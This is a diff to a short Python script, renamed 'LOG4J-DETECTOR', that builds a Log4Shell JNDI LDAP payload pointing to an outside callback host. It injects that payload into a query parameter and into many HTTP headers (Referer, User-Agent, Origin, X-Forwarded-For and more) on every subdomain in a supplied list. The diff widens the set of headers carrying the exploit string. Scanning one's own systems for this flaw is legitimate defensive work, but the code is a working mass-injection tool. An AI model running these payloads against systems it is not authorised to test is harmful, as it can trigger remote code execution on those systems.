@@ -1,6 +1,6 @@
 """
 Author : SAM
-LOG4J
+LOG4J-DETECTOR
 """
 
 import requests
@@ -11,7 +11,7 @@ fpayload = "${jndi:ldap://"+payload+"/a}"
 
 
 subd =  list(open(fil).read().split())
-headers={"Referer":fpayload,"User-Agent": "Mozzila"+fpayload}
+headers={"Referer":fpayload,"User-Agent": "Mozzila"+fpayload,"Origin": fpayload,"Location": fpayload,"Report-To": fpayload,"X-Forwarded-For": fpayload,"X-Forwarded-Host": fpayload,"X-Forwarded-Proto": fpayload}
 for i in range(len(subd)):
 	furl="https://"+subd[i]+"?test="+fpayload
 	#furl2="http://"+subd[i]+"?test="+fpayload
